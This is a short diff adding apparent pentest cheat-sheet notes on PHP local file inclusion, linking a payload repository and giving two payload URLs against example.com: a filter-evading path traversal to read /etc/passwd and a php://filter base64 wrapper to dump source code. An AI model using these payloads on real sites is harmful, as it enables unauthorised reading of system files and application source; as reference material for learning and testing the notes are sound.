@@ -1,0 +1,12 @@
+Local file inclusion :
+PHP 
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+
+
+basic trick:
+
+http://example.com/index.php?page=....//....//etc/passwd
+
+
+filter base 64:
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
